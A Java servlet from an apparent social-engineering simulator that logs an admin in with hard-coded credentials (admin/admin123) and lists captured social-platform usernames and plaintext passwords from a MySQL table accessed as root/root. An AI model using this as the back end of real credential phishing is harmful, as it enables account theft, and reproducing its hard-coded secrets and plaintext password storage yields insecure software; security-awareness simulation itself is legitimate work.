package soesim;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;

import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

/**
 * Servlet implementation class AdminDashboardServlet
 */
@WebServlet("/admin_dashboard")
public class AdminDashboardServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public AdminDashboardServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
	
        }

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		
		String username = request.getParameter("admin_username");
        String password = request.getParameter("admin_password");

        // Basic authentication
        if (!"admin".equals(username) || !"admin123".equals(password)) {
            request.setAttribute("error", "INVALID ADMIN CREDENTIALS.");
            request.getRequestDispatcher("login.jsp").forward(request, response);
            return;
        }

        // Authentication successful
        HttpSession session = request.getSession();
        session.setAttribute("isAdmin", true);

        List<String> logs = new ArrayList<>();

        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/socialsimdb", "root", "root");

            Statement stmt = con.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT platform, username, password, timestamp FROM user_credentials");

            while (rs.next()) {
                String logEntry = "👤 " + rs.getString("username") +
                        " | 🔑 " + rs.getString("password") +
                        " | 🕒 " + rs.getString("timestamp") +
                        " | 📱 " + rs.getString("platform");
                logs.add(logEntry);
            }

            rs.close();
            stmt.close();
            con.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        session.setAttribute("logs", logs);

        // Redirect instead of forward to trigger new request
        response.sendRedirect("admin_dashboard.jsp");
    }
                     
}